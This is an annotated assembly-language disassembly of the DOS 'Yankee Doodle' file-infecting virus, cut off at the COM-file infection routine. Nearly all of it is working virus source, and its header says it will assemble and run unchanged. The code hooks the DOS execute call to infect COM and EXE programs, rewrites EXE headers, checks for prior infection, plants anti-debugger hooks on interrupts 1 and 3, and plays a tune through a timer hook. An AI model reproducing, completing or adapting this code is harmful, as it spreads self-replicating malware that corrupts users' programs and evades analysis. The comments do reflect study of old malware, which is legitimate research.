;THE YANKEE DOODLE VIRUS 
;POOR DISASSEMBLY OF IT MANY REFRENCE MADE AS ABSOLUTE WHEN THEY SHOULD
;BE REFRENCE TO LOCATIONS IN PROGRAM
;WILL WORK IF NO CHANGES MADE TO CODE 
;EXCUSE SOME OF THE COMMENTS WHICH MAKE NO SENSE
	.RADIX 16
INT01_OFFS      EQU     0004

INT03_OFFS      EQU     000C

MEM_SIZE        EQU     0413
TIMER_HI        EQU     006E           
TIMER_LO        EQU     006C                    


;******************************************************************************
;The host program starts here. This one is a dummy that just returns control
;to DOS.
host_code       SEGMENT byte            
	ASSUME  CS:host_code, ds:host_code
		ORG     0
		db      1eh dup (0)
HOST:           DB      0B8H, 00H, 4CH, 0CDH 
		DB      '!OS   SYS'
		DB      7,0,0,0,0

host_code       ENDS

		


vgroup          GROUP virus_code
virus_code      SEGMENT byte
		ASSUME cs:virus_code, ds:virus_code
		
		

;data AREA
			
TOP_VIR:        db      0f4h
		db      7ah
		DB      2Ch            ;used as a marker

D003            DB      00

FSIZE1          DW      0000                    ;filsize being infected
FSIZE2          DW      0223                    ;in bytes hex of course

D1              Dw      0abeh                ;used as a marker

TOP_HOST        DW      5A4DH           ;USED AS A FILE BUFFER
					;WHEN FILE IS EXE BELOW IS TRUE
					;SIGANATURE
P_SIZE          DW      0023                   ;LAST PAGE SIZE
P_COUNT         DW      0002                   ;PAGE COUNT
RELOC           DW      0000                    ;RELOC TABEL ENTRIES
H_PARA          DW      0020                   ;#HEADER PARAGRAPHS
MINALLOC        DW      0001                   ;MIN ALLOC OF MEM
MAXALLOC        DW      0FFFF                   ;MAX ALLOC OF MEM
I_SS            DW      0000                    ;INTIAL SS
I_SP            DW      0000                    ;INTIAL SP
CHECKSUM        DW      0000                    ;CHECKSUM
I_IP            DW      0000                    ;I_IP  PRE INFECTION
I_CS            DW      0000                    ;I_CS
REL_OFFSET      DW      003E                   ;RELOCATION OFFSET
O_NUM           DW      0000                    ;OVERLAY NUM
						;EXTRA NOT USED DURING EXE 
						;HEADER READING
REM1            DB      01,00,0FBH,30             ;D0026
;end of top_host buffer
;***********************************************************************

OLD_INT21_OFS   DW      109E
OLD_INT21_SEG   DW      0116

OLD_INT21_OFS2  DW      109E
OLD_INT21_SEG2  DW      0116

OLD_INT24_OFS   DW      0155
OLD_INT24_SEG   DW      048Ah

OLD_INT1C_OFS   DW      0FF53
OLD_INT1C_SEG   DW      0F000

F_HANDLE        DW      5                       ;3A
F_TIME          DW      5002                    ;
F_DATE          DW      1ACC                    ;3E

;USED IN VIT INT 1C PART

X1              DW      00DE                    ;0040
X2              DW      006A                    ;0042

BUFFER1         DB      2E,83,3E,5E,0C
BUFFER1A        DB      0F4,06,70,00

BUFFER2         DB      2E,83,3E,5E,0C
BUFFER2A        DB      0F4,06,70,00

SNARE           DB      00                      ;0056

X4              DB      00        

F_ATTR          DB      20      

PLAY_TUNE       DB      01                      ;0059
REM2            DB      00                      ;005A

COMFILE         DB      00
INFEC_FL        DB      00

CTRL_FLAG       DB      00                      ;5D
COUNTER         DB      7BH                     ;5E
X7              DB      01                      ;5F
X8              DW      00                      ;60

PAGE_16         DW      0010                    ;
HOST_IP         DW      0100                    ;FOR COM FILE INFECTIONS
EXE_PG_SIZE     DW      0200                    ;                

C_OFFSET_21     DW      OFFSET CALL_INT21       ;2CFH      

X101            DB      0C7,11
X10             DB      0C7,11                   ;
X11             DB      0E6,0F                   ;006E
X12             DB      28,0E                   ;70
		DB      0C7,11                   ;72
		DB      28,0E                   ;74
		DB      0E6,0F                   ;76
		DB      0C4,17                   ;78

		DB       0C7,11,0C7,11          ;7a
		DB       0E6,0F                 ;7e
		DB       28,0E,0C7,11           ;80
		DB       0C7,11,0C7,11          ;84
		DB       0C7,11,0E6,0F          ;88
		DB       28, 0E, 59, 0Dh        ;8c
		DB       28,0E,0E6,0f           ;90

		
		DB        0C7, 11, 0ef, 12
		DB        0C4,17      
		DB        2C,15      
		DB        0EF        
		DB        12,0C7      
		DB        11,0C7      
		DB        11,2C      
		DB        15,0EF,12    
		DB        2C,15      
		DB        0C5,1A      
		DB        2C,15      
		DB        0EF       
		DB        012,0C7
		DB        011,2C
		DB        015,0C4,17
		DB        02C,15
		DB        0C4,17
		DB        0C5,1A
		DB        67                                ;BA
		DB        1C,0C5     
		DB        1A,0C4   
		DB        17          
		DB        2C,15        
		DB        0EF          
		DB        12,2C        
		DB        15,0C5,1A      
		DB        2C,15        
		DB        0EF          
		DB        12,0C7        
		DB        11,2C        
		DB        15,0C4,17      
		DB        0C7,11,0EF,12    
		DB        0E6,00FH        
		DB        0C7,11,0C7,11    
		DB        0FF,0FF        
		DB        05,05,05      
		DB        05,05,05      
		DB        05,05,05      
		DB        05,05,05
		DB        09,09        
		DB        05,05,05      
		DB        05,05,05      
		DB        05,05,05      
		DB        05,05,05      
		DB        09,09        
		DB        05,05,05      
		DB        05,05,05      
		DB        05,05,05      
		DB        05,05,05      
		DB        05,05,06      
		DB        05,05,05      
		DB        05,05,05      
		DB        05,06,05      
		DB        05,05,05      
		DB        09,09                                   ;115       
      
NEW_PONG:                
	DB      0FEh, 06h, 7Ah, 7Dh           ;INC     BYTE PTR [7D7A]     0117              
	DB      0FEH, 06, 0FBH, 7Dh          ;INC     BYTE PTR [7DFB]
	DB      74,05                  ;JZ      0126                               
	DB      0EA,00,7C,00,00        ;JMP     0000:7C00                          
	DB      0FC                    ;CLD                                        
	DB      33,0C0                 ;XOR     AX,AX                              
	DB      8E,0C0                 ;MOV     ES,AX                              
	DB      0BE, 2Ah, 7Dh              ;MOV     SI,7D2A                            
	DB      0BF, 4Ch, 00              ;MOV     DI,004C                            
	DB      0A5                     ;MOVSW
	DB      0A5                     ;MOVSW
	DB      26                     ;ES:
	DB      83, 06, 13, 04, 02         ;ADD     WORD PTR [0413],+02                
	DB      0EAh, 00, 7Ch, 00, 00        ;JMP     0000:7C00           0139               


;DATA ENDS

;******************************************************************
P_MIN_MAX_ALLOC PROC    NEAR
;ENTRY SI = 14H = OFFSET MINALLOC
;           16H = OFFSET MAXALLOC
;THIS PROCEDURE ALTERS THE GIVEN  VALUES
;TO BE USEFULE TO THE VIRUS WHEN GOING TSR
;by editing the min and max memory requirments
;so that it doesn't need to release mem to go memory resident

	MOV     AX,[SI]
	SUB     AX,0BBH
	JB      TOSMALL

	CMP     AX,08
	NOP
	JB      TOSMALL

EXIT_MIN_MAX:
	MOV     [SI],AX
	RETN

TOSMALL:
	MOV     AX,09
	JMP     short EXIT_MIN_MAX

P_MIN_MAX_ALLOC ENDP    

;*************************************************************************
HOOK_1_3  PROC  NEAR
;CALLED BY SET_TO_HOOK1_3
; ON ENTRY HAS DI = 44 BX= 4
;              DI = 4D BX= C      
;              DS = CS OF HERE BY VIR INT 1C          
	PUSH    SI
	PUSH    DS
	PUSH    CX

	PUSH    DS
	POP     ES                              ;ES POINTS HERE
	
	MOV     DS,WORD PTR [X7 + 1]                         ;APPARENTLY = 0000
						;
	LDS     SI,DWORD PTR [BX]                         ;loads DS:SI = DS:[bx]
						;
	MOV     WORD PTR ES:[DI+ 5],SI          ;
	MOV     WORD PTR ES:[DI+ 7],DS          ;
	CMP     BYTE PTR [SI],0CFH              ;
	JE      EXIT_HOOK_1_3                   ;J17D
;if we get this far hook by manliputaing  the vector table
;si = vector for int1 or int3 
;int used by debug programs

	CLD
	MOV     CX,0005
	REPZ    MOVSB
	MOV     BYTE PTR [SI-05],9A             ;flag
	MOV     WORD PTR [SI-04],OFFSET anti_DEBUG  ;a ip  01c3
	MOV     WORD PTR [SI-02],CS             ;a cs

EXIT_HOOK_1_3:
	POP     CX
	POP     DS
	POP     SI
	RETN     
HOOK_1_3           ENDP

;***************************************************
SET_TO_HOOK1_3          PROC    NEAR
;CALLED BY VIR INT 1CH

	PUSH    BX
	PUSH    DI
	
	MOV     BX,INT01_OFFS           ;0004 VECTOR TO INT3
	MOV     DI,OFFSET BUFFER1       ;0044
	CALL    HOOK_1_3                  ;SET UP HOOK INT 1

	MOV     BX,INT03_OFFS           ;000C VECTOR TO INT3
	MOV     DI,OFFSET BUFFER2       ;004D
	CALL    HOOK_1_3                  ;SET UP TO HOOK INT 3

	POP     DI
	POP     BX
	RET

SET_TO_HOOK1_3          ENDP
;*************************************************************************

RESTORE_1_3  PROC  NEAR
;ENTRY SI = BUFFER1   ;2E,83,3E,5E,0C   F4,06,70,00
;           BUFFER2  
;NOT SURE WHY BUT IT SEEMS THAT THIS CODE WILL CHECK FOR MEM LOCATION
; 0070:60F4 = 9A,01,C3 IF THERE IT WILL
;RESTORE OF BUFFER1/2 OVER THIS LOCATION WHICH WAS THE ORGINAL
; VECTOR ADDRESS INT

	PUSH    CX    
	PUSH    DI

	LES     DI,DWORD PTR [SI+05]                      ;load this 4 bytes as a mem
						;location into es:di
						;0070:06f4
	CMP     BYTE PTR ES:[DI],9A
	JNE     EXIT_RESTORE_1_3

	CMP     WORD PTR ES:[DI+01],OFFSET anti_DEBUG
	JNE     EXIT_RESTORE_1_3

	MOV     CX,5                            ; MOV   5 BYTES
	CLD                                     ; FROM DS:[SI]
	REPZ    MOVSB                           ;      HERE:[BUFFERX]
						; TO ES:[DI]
						;    0070:06F4
EXIT_RESTORE_1_3:
	POP     DI
	POP     CX
	RETN
RESTORE_1_3          ENDP

;*************************************************************

SET_TO_REST_1_3          PROC
;THIS PROCEDURE SEEMS TO RESTORE THE THE INT 1 AND 3 TO THERE PROPER 
;LOCATIONS IF WE HAVE ALTERED THEM IT CHECK AND CORRECTS THEM
;IN RESTORE_1_3
;CALLED BY VIR INT 1C

	PUSH    SI
	MOV     SI,OFFSET BUFFER2     
	CALL    RESTORE_1_3

	MOV     SI,OFFSET BUFFER1     
	CALL    RESTORE_1_3

	POP     SI
	RETN
SET_TO_REST_1_3          ENDP

;**********************************************************************
;J01C3
;called int 1\ used by debuggers not program is disenfected if
;       int 3/ resident and td or debug is used
;       BY PUTTING IN TO THE INT VECTOR FOR INT 1 OR AND INT 3
;THE ADDRESS OF THIS SPOT
;BY HOOK_1_3
;

anti_DEBUG      PROC                          ; P_01C3          
					      ;           A
	PUSH    BP                            ;           8
	MOV     BP,SP                         ; FLAGS     6
	PUSHF                                 ; CS        4
					      ; IP        2
	PUSH    ES                            ; BP <-BP
	PUSH    DS
	
	PUSH    BX
	PUSH    AX
	
	PUSH    CS
	pop     DS

	CALL    SET_TO_REST_1_3                  ;RESTORE PROPER VECTORS
					;IF ALTERED WHICH TO GET HERE IT 
					;ONE OF THEM WOULD HAVE HAD TO BEEN

	MOV     AX,CS                           ;this test if the calling
	CMP     WORD PTR [BP+08],AX             ;return to from this is
	JE      viral_cs                        ;J020C is our cs
	
	MOV     DS,WORD PTR [BP+08]
	CMP     WORD PTR [BX+OFFSET TOP_VIR+2],2C         ; THIS INFO IS LOCATED AT TOP
	JNE     EXIT_TO_VIR                    ; OF VIRUS AND MAYBE AT END AS 
					       ; END AS WELL
	CMP     WORD PTR [BX+OFFSET TOP_VIR],7AF4        ;
	JNE     EXIT_TO_VIR                    ;

	;CMP     WORD PTR [BX + 0008h],0ABE
	db      81, 0bf, 08, 00, 0be, 0a
	JNE     EXIT_TO_VIR

	MOV     AX,DS                         ; BX /16 BY {4 SHR}
	SHR     BX,1                          ; WHAT WAS IN BX OFFSET OF VIRUS
	SHR     BX,1                          ; BX APPEARS TO POINT TO
	SHR     BX,1                          ; TOP VIRUS
	SHR     BX,1                           ; CS + IP/16 = EA
	ADD     AX,BX                          ;
	MOV     DS,AX                          ;DS = SOM EFFECTIVE ADDRESS
	JMP     SHORT viral_cs                          ;

EXIT_TO_VIR:                                    ;J0201
	SUB     WORD PTR [BP+02],05
	POP     AX
	POP     BX
	POP     DS
	POP     ES
	POPF
	POP     BP
	RETF

viral_cs:
	CALL    P_030E
	
	MOV     AX,WORD PTR [BP+0A]
	INC     BYTE PTR [REM2]                 ;005A      IF = 0A FLAGS
	TEST    AX,0100                         ;               08 CS
	JNZ     J0222                           ;               06 IP
	DEC     WORD PTR [BP+06]                ;                4
	DEC     byte PTR [REM2]                 ;005A            2   
						;                BP
J0222:        
	AND     AX,0FEFFH                        ; TURNS OFF IF FLAG
	MOV     [BP+0A],AX                      ; IF ON

	PUSH    CS
	POP     DS
	CALL    SET_TO_HOOK1_3                  ; THIS CALL  SETS UP THE
						; INTERUPTS 1 AND 3 
						; TO GO HERE IF 
						; THINGS MATCH

	POP     AX
	POP     BX
	POP     DS
	POP     ES
	POPF    
	POP     BP
	ADD     SP,+04                          ;REMOVE LAST 2 PUSH
	IRET
anti_DEBUG          ENDP
;************************************************************************

VIR_INT_1C      PROC

	PUSH    BP
	MOV     BP,SP
	PUSHF
	PUSH    AX
	PUSH    BX
	PUSH    DS
	PUSH    ES

	PUSH    CS
	POP     DS

	CALL    SET_TO_REST_1_3                     ;AGAIN RESTORES 1 AND 3 INT
					   ; TO PROPER LOCATIONS
					   ;IF NEED BE

	CALL    SET_TO_HOOK1_3                     ;ALTERS THE 1 AND 3 INT
					   ; TO OUR INT HANDLER
					   ;IF SOMETHING IS WRONG

	MOV     AX,0040
	MOV     ES,AX
	TEST    BYTE PTR [COUNTER],07
	JNE     WRONG_TIME                      ;J0274

;NOTICE THAT THIS CMP INSTRUCTIONS ARE LOOKING AT 0040:
	CMP     WORD PTR ES:[TIMER_HI],11           ;
	JNE     WRONG_TIME                       ;J0274

	CMP     WORD PTR ES:[TIMER_LO],00           ;
	JNE     WRONG_TIME                       ;J0274

	MOV     BYTE PTR [PLAY_TUNE],00
	MOV     WORD PTR [X1],00DE              ;0040
	MOV     WORD PTR [X2],006A              ;0042

WRONG_TIME:                                     ;J0274
	CMP     BYTE PTR [PLAY_TUNE],1         ;01 MEANS NO
	JE      EXIT_VIR_1C                     ;J02C4
	
	CMP     BYTE PTR [X4],00             ;
	JE      J0288

	DEC     BYTE PTR [X4]
	JMP     SHORT EXIT_VIR_1C

J0288:
	MOV     BX,[X2]
	CMP     WORD PTR [BX],0FFFFH
	JNE     J029E

	IN      AL,61
	AND     AL,0FC
	OUT     61,AL
	MOV     BYTE PTR [PLAY_TUNE],01
	
	JMP     short EXIT_VIR_1C
	

J029E:
	MOV     AL,0B6
	OUT     43,AL
	MOV     AX,[BX]
	OUT     42,AL
	MOV     AL,AH
	OUT     42,AL
	IN      AL,61
	OR      AL,03
	OUT     61,AL
	ADD     WORD PTR [X2],+02
	MOV     BX,WORD PTR [X1]
	MOV     AL,[BX]
	DEC     AL
	MOV     BYTE PTR [X4],AL
	INC     WORD PTR [X1]

EXIT_VIR_1C:
	POP     ES
	POP     DS
	POP     BX
	POP     AX
	POPF
	POP     BP
	JMP     DWORD PTR CS:[OLD_INT1C_OFS]
VIR_INT_1C              ENDP                      
;*************************************************************
CALL_INT21:     JMP     DWORD PTR CS:[OLD_INT21_OFS]

REAL_INT21:     JMP     DWORD PTR [OLD_INT21_OFS]

;*************************************************************
P_02D8          PROC  NEAR
;CALLED BY HANDLE_4B
	PUSH    BP
	MOV     BP,SP
	CLD     
	PUSH    [BP+0AH]
	PUSH    [BP+08]
	PUSH    [BP+04]
	CALL    P_09C8

	ADD     SP,+06                  ;REMOVE LAST 3 PUSHES

	PUSH    [BP+0CH]
	PUSH    [BP+06]
	PUSH    [BP+08]
	CALL    P_0A58

	ADD     SP,+06                  ;REMOVE LAST 3 PUSHES

	PUSH    [BP+0CH]
	PUSH    [BP+08]
	PUSH    [BP+06]
	PUSH    [BP+04]
	CALL    P_0A7F

	ADD     SP,+08
	POP     BP
	RETN
P_02D8          ENDP   
;**********************************************************************

P_030E          PROC
;CALLED BY HANDLE_4B

;CALLED BT VIR INT 1 INT3 IN HIGH MEM
;IN INT 3 1 CASE IT SEEMS 
;THAT DX= EA 0F TOP OF VIRUS POSSIBLE 
;TO RETURN 5 WORDS IN STACK TOP 3 = FL,CS,IP
;BOTTOM 2 ARE THROWN OUT

	PUSH    AX
	PUSH    BX
	PUSH    CX
	PUSH    DX
	PUSH    SI
	PUSH    DI
	PUSH    ES
	PUSHF
	CLI                             ;CLEAR IF
	
	MOV     AX,8                            ;
	PUSH    AX                              ;1
						
	MOV     AX,00AE                         ;
	PUSH    AX                              ;2

	MOV     AX,OFFSET VGROUP:BOT_VIR        ;B40
	MOV     CL,04                           ;
	SHR     AX,CL                           ;
	MOV     DX,DS                           ;
	ADD     AX,DX                           ;     
	PUSH    AX                              ;3    END OF VIRUS EA

	MOV     AX,OFFSET J0AC0                 ; 0AC0b
	SHR     AX,CL                           ;
	ADD     AX,DX                           ;
	PUSH    AX                              ;4

	MOV     AX,0060                         ;
	SHR     AX,CL                           ;
	ADD     AX,DX                           ;
	PUSH    AX                              ;5

	CALL    P_02D8

	ADD     SP,0AH                          ;REMOVE LAST 5 PUSHES
	POPF
	POP     ES
	POP     DI
	POP     SI
	POP     DX
	POP     CX
	POP     BX
	POP     AX
	RETN
P_030E          ENDP
;*****************************************************************
WRITE_FILE      PROC NEAR 
	MOV     AH,40
	jmp     short   r_w_int21

READ_FILE:
	MOV     AH,3F

R_W_INT21:        
	CALL    I21_F_HANDLE                    ;J035C
	
	JB      J0357
	CMP     AX,CX
J0357:  RETN
WRITE_FILE      ENDP
;******************************************************************
START_FILE      PROC NEAR
	XOR     AL,AL
MOV_F_PTR:     
	MOV     AH,42                           ;MOVE FILE PTR

I21_F_HANDLE:
	MOV     BX,WORD PTR CS:[F_HANDLE]

C2_INT21:
	PUSHF
	CLI                                     ;CLEAR IF
	CALL    DWORD PTR CS:[OLD_INT21_OFS2]
	RETN
START_FILE      ENDP
;*********************************************************************                                                                                                       

FORCE_WRITE     PROC NEAR
	PUSH    BX
	PUSH    AX
	MOV     BX,WORD PTR CS:[F_HANDLE]
	MOV     AH,45                           ;GET DUPLICATE FILE HANDLE
	CALL    C2_INT21
	JB      WRITE_ER                        ;J0380

	MOV     BX,AX
	MOV     AH,3E
	CALL    C2_INT21
	JMP     short NO_PROBLEM

WRITE_ER:
	CLC                                     ;        CLEAR CF
NO_PROBLEM:
	POP     AX
	POP     BX
	RET

FORCE_WRITE     ENDP
;******************************************************************

VIR_INT24:       
	MOV     AL,03
	IRET
 
HANDLE_C603:                                    
  ;THIS IS THE INSTALATION CHECK CALLED ON BY THE VIRUS
  ;CHECKS TO SEE IF IN INSTALLED IN MEMORY
  ;CALLED CF CLEAR, BX SET 002C, AX SET C603
  ; RETURNS
  ; IF CF IS SET THEN THEN IT IS INSTALLED
  ;
	MOV     AX,02DH
	
	TEST    BYTE PTR CS:[X7],02
	JNZ     J393
	
	DEC     AX

J393:   CMP     BX,AX
	XOR     AL,AL                   ;ZEROS AL
	
	RCL     AL,1                    ;ROTATE LEFT THRU CARRY
					;SHIFTS AL 1 BIT TO LEFT THRU CF
					;MOVES THE CF BIT INTO AH
	
	PUSH    AX
	MOV     AX,002C
	TEST    BYTE PTR CS:[X7],04
	JNZ     J3A6
	
	INC     AX

J3A6:   CMP     BX,AX

	
	LES     BX,DWORD PTR CS:OLD_INT21_OFS2

						;LOADS ES WITH SEGMENT
						; ADDRESS AND BX OFFSET
						; IE. ES:BX -> OLD_INT21_OFS
						
	POP     AX                              ;

	INC     SP                              ;
	INC     SP                              ; SP=SP+2 REMOVE LAST 1 PUSH
						; IE. LAST PUSHF
	STI                                     ;SET INTERUPT FLAG
	RETF    2                               ; RETURN TO HOST
;END HANDLE_C603

HANDLE_C600:
;REASON UNKNOW
; DOESN'T SEMM TO BE CALLED BY THIS VIRUS
;
	MOV     AX,2C
	JMP     short HANDLE_C5

HANDLE_C601:
;REASON ?
;DOESN'T SEEM TO BE CALLED BY VIRUS
;
	MOV     AL,BYTE PTR CS:[X7]
	XOR     AH,AH
	JMP     short HANDLE_C5

HANDLE_C602:
;REASON ?
;DOESN'T SEEM TO BE CALLED BY VIRUS
;
	MOV     BYTE PTR CS:[X7],CL
	JMP     SHORT HANDLE_C5


VIR_INT_21              PROC
	PUSHF

	CMP     AH,4BH                         ; LOAD EXEC CALL
	JZ      HANDLE_4B                      ; LET VIRUS GO

	CMP     AH,0C5
	JZ      HANDLE_C5

	CMP     AX,0C600
	JZ      HANDLE_C600

	CMP     AX,0C601
	JZ      HANDLE_C601

	CMP     AX,0C602
	JE      HANDLE_C602
	
	CMP     AX,0C603
	JE      HANDLE_C603

	POPF    
	JMP     GOTO_INT21      ;NONE OF OUR INTERRUPTS LET       
				;DOS INT 21 HANDLE IT

HANDLE_C5:
	POPF                     ; SETS THE MASKABLE INTERUPTS ON 
	STI                      ;
	STC                      ; SETS THE CF FLAG
	RETF    2                ;

HANDLE_4B:
	
	PUSH    AX
	XOR     AL,AL
	XCHG    AL,BYTE PTR CS:[INFEC_FL]       ;POSSIBLE VAL = 00, FF
						;00 OR 00 = 0 ZF SET
						;FF OR FF = FF ZF CLEAR
						;IF FF CONTINUE TO ATTEMPT
						;INFECTION PROCESS
	OR      AL,AL
	POP     AX
	JNZ     CONT

	POPF    
	JMP     GOTO_INT21                      ;INFEC_FL = 00 SO LET
						;DOS HANDLE IT

CONT:
	PUSH    DS                              ;SAVE DS = FILE DS
	PUSH    CS                              ;SET DS TO CS
	POP     DS                              ;TSR INFECTION

	CALL    P_030E                          ;

	MOV     WORD PTR [OFFSET C2_INT21],9090

	CALL    P_030E                           ;

	POP     DS                              ;RESTORE DS TO FILE DS
			       
	PUSH    ES             ;BP E               ;
	PUSH    DS             ;BP C               ;SAVE REGS
	PUSH    BP             ;BP A               ;THAT MAY BE
	PUSH    DI
	PUSH    SI             ;BP 8               ; DESTROYED
	PUSH    DX             ;BP 6               ;LATER TO 
	PUSH    CX             ;BP 4               ;BE RESTORED
	PUSH    BX             ;BP 2               ;FOR RETURN TI INT 21
	PUSH    AX             ;BP                 ;
;BP POINTS AT AX
	MOV     BP,SP
	
	PUSH    CS                              ;DS = TSR INFECTION
	POP     DS                              ;
						
	CMP     BYTE PTR [REM2],00             ;INFECTED = 00 IF EQUAL
	JE      J429                            ;NOT INFECTED YET
	
	JMP     LEAVE_

J429:   INC     BYTE PTR [COUNTER]

	PUSH    [BP+0E]                         ;
	PUSH    [BP+06]                         ;
	CALL    OPEN_FILE

	LAHF                                    ;LOAD AH WITH FLAGS    
	ADD     SP,+04                          ;REMOVE LAST 2 PUSHS
	SAHF                                    ;LOAD FLAGS WITH AH

	JNB     CHK_FOR_INFEC                   ;IF NO ERROR
	JMP     LEAVE_                          ;PROBALY ERROR

CHK_FOR_INFEC:                                  ; J440 
	XOR     CX,CX                           ; SET PTR TO START OF
	XOR     DX,DX                           ; VICTIM
	CALL    START_FILE                      ;

	MOV     DX,OFFSET TOP_HOST              ;READ 14 BYTES TO
	MOV     CX,14                           ;
	CALL    READ_FILE                       ;
	JB      ALREADY_INFECTED                ;ERROR
; USE CHECKSUM TO FIND POSSIBEL WHERE FILE INFECTION OCCURS
; PLACE PTR THERE

	MOV     AX,WORD PTR [CHECKSUM]          ;CHECKSUM * 10
	MUL     WORD PTR [PAGE_16]              ;=0010H  DX:AX = ORG_SIZE
	MOV     CX,DX                           ;MOV RESULTS INTO CX
	MOV     DX,AX                           ;DX        
	CALL    START_FILE                      ;SET POINTER TO  A POINT
						;CX:DX FROM START
						;WHICH IN A INFECTED FILE
						;WOULD BE START OF VIRUS
;READ TO THIS LOCATION FORM FILE                                                        

	MOV     DX,OFFSET TOP_VIR               ;READ TO THIS LOCATION
	MOV     CX,2A                           ;2A BYTES        
	CALL    READ_FILE                       ;
	JB      NOT_INFECTED                    ;IF ERROR FILE NOT THAT LONG    
						; CAN'T BE INFECTED
; NOW COMPARE  TO SEE IF FILE IS INFECTED

	CMP     WORD PTR [TOP_VIR],7AF4         ;
	JNE     NOT_INFECTED                    ;NOT INFECTED GO INFECT             
	
	MOV     AX,002C
	CMP     BYTE PTR [BP+00],00
	JNE     J483

	TEST    BYTE PTR [X7],02             ;JUMP IF AN AND OPERATION
	JZ      J484                            ;RESULTS IN ZF SET

J483:   INC     AX                              ;
J484:   CMP     WORD PTR [TOP_VIR+2],AX         ;JUMP IF TOP_VIR+2 => AX
	JNB     ALREADY_INFECTED                            ;        

;FILE IS ALREADY INFECTED RESTORE  TO ORGINAL  FORM

	XOR     CX,CX                           ;SET FILE PTR TO 
	XOR     DX,DX                           ;ACTUAL START OF
	CALL    START_FILE                      ;FILE

	MOV     DX,OFFSET TOP_HOST                     ;
	MOV     CX,20H                          ;
	CALL    WRITE_FILE                      ;        
	JB      ALREADY_INFECTED                ;ERROR

	CALL    FORCE_WRITE                     ; THIS WOULD EFFECTIVELY
						; DISINFECT FILE
	JNB     J4A4                                    

ALREADY_INFECTED:    
	JMP     CLOSE_EXITVIR                   ; FILE NOW DISINFECTED
	
J4A4:   MOV     CX,WORD PTR [FSIZE1]            ;GOTO END OF HOST
	MOV     DX,WORD PTR [FSIZE2]            ;
	CALL    START_FILE                      ; 

	XOR     CX,CX                           ;WRITE 00 BYTES
	CALL    WRITE_FILE                      ;IF ERROR
	JB      ALREADY_INFECTED                ;EXIT

	CALL    FORCE_WRITE
	JB      ALREADY_INFECTED

;AT THIS TIME THE POSSIBLE INFECTION HAS BEEN REMOVED AND THE FILE RESTORE TO        
;ORGIONAL SIZE AND FUNCTION
	
	JMP     CHK_FOR_INFEC                             ;J440

NOT_INFECTED:                                   ;J4BD   
	MOV     AL,02
	MOV     CX,0FFFF
	MOV     DX,0FFF8
	CALL    MOV_F_PTR

	MOV     DX,OFFSET TOP_HOST              ;BUFFER TO READ INTO           
	MOV     CX,08H                          ;FOR LENGTH
	CALL    READ_FILE

	JB      ERROR_LVE

	CMP     WORD PTR [P_COUNT],7AF4         ;IF == MAYBE INFECTED
	JE      MAKE_SURE                       ;J4E0
	JMP     SHORT INFECT                            ;J538

ERROR_LVE:   
	JMP     CLOSE_EXITVIR                   ;J6AE

MAKE_SURE:   
	CMP     BYTE PTR [RELOC],23             ; IF >= 
	JNB     ERROR_LVE                         ;IT IS INFECTED

	MOV     CL,BYTE PTR [RELOC+1]           ; ????
	MOV     AX,WORD PTR [TOP_HOST]             ; POSSIBLE SETING UP JUMP
	MOV     WORD PTR [FSIZE2],AX              ; FOR COM FILE
	MOV     AX,WORD PTR [P_SIZE]            ;
	SUB     AX,0103H                          ; WHY 103
	MOV     WORD PTR [TOP_HOST+1],AX          ;
	CMP     BYTE PTR [RELOC],09             ;
	JA      J503                              ;
	

	MOV     CL,0E9                             ;

J503:   MOV     BYTE PTR [TOP_HOST],CL            ;E9= JMP

	XOR     CX,CX                             ;
	MOV     DX,CX                             ;
	CALL    START_FILE                        ;
	
	MOV     DX,OFFSET TOP_HOST                ;
	MOV     CX,0003H                          ;
	CALL    WRITE_FILE                        ;
	JB      ERROR_LVE                         ;J4DD

	CALL    FORCE_WRITE
	JB      ERROR_LVE                         ;J4DD

	XOR     CX,CX                           ;SET FILE POINTER TO END
	MOV     DX,WORD PTR [FSIZE2]            ;OF HOST FILE
	CALL    START_FILE                      ;
	XOR     CX,CX
	CALL    WRITE_FILE
	JB      ERROR_EXIT
;52E
	CALL    FORCE_WRITE
	JB      ERROR_EXIT
	JMP     NOT_INFECTED                    ;J4BD

ERROR_EXIT:   JMP     CLOSE_EXITVIR                   ;J6AE

;J538
INFECT: 
	MOV     WORD PTR [TOP_VIR],7AF4      
	MOV     WORD PTR [TOP_VIR+2],2C
	MOV     WORD PTR [TOP_VIR+8],0ABE       
	
	CMP     BYTE PTR [BP+00],00
	JNE     ERROR_EXIT                            ;J535

	TEST    BYTE PTR [X7],01
	JE      ERROR_EXIT
;THIS NEXT PIECE WILL TELL POINTER TO GO TO END OF FILE
;WITH OFFSET 0:0 WHICH SETS DX:AX TO #BYTES IN ENTIRE FILE
;J557
	MOV     AL,02
	XOR     CX,CX
	MOV     DX,CX
	CALL    MOV_F_PTR
	MOV     [FSIZE1],DX
	MOV     [FSIZE2],AX

	XOR     CX,CX
	MOV     DX,CX
	CALL    START_FILE

	MOV     DX,OFFSET TOP_HOST              ;BUFFER
	MOV     CX,20                           ;#BYTES TO READ
	CALL    READ_FILE                       ;
	JB      ERROR_EXIT                      ;J535

;CHECK FOR TYPE OF FILE BY TESTING FOR SIGNATURE MZ OR ZM
;IF NEITHER IT IS A COM FILE
;J579
	CMP     WORD PTR [TOP_HOST],"ZM"
	JE      EXE_INFEC
	CMP     WORD PTR [TOP_HOST],"MZ"
	JNE     COM_INFEC

EXE_INFEC:
	MOV     BYTE PTR [COMFILE],00
	MOV     AX,WORD PTR [P_COUNT]        ;000E
	MUL     WORD PTR [EXE_PG_SIZE]          ;0066 = 200H
	SUB     AX,[FSIZE2]                     ;AX=#BYTES IN HOST
	SBB     DX,[FSIZE1]                     ;IF BELOW ERROR SOMEPLACE
	JB      J5E1                            ;J5E1 EXIT ERROR 

	MOV     AX,WORD PTR [I_SS]              ;0018
	MUL     WORD PTR [PAGE_16]              ;0062
	ADD     AX,WORD PTR [I_SP]              ;001A
	MOV     CX,DX                           ;SAVE RESULT EFF ADDRESS OF
	MOV     BX,AX                           ;SS:SP AT START OF PROGRAM

	MOV     AX,[H_PARA]                ;0012
	MUL     WORD PTR [PAGE_16]              ;0062
	MOV     DI,WORD PTR [FSIZE1]
	MOV     SI,WORD PTR [FSIZE2]
	
	ADD     SI,+0F
	ADC     DI,+00
	AND     SI,-10
	
	SUB     SI,AX
	SBB     DI,DX

	MOV     DX,CX
	MOV     AX,BX

	SUB     AX,SI
	SBB     DX,DI
	
	JB      J5FF
;J5D4
	ADD     SI,0DC0
	ADC     DI,+00
	SUB     BX,SI
	SBB     CX,DI
	
	JNB     J5FF                            ;IF NO ERROR

J5E1:   JMP     CLOSE_EXITVIR                   ;J6AE

COM_INFEC:                                      ;j5E4
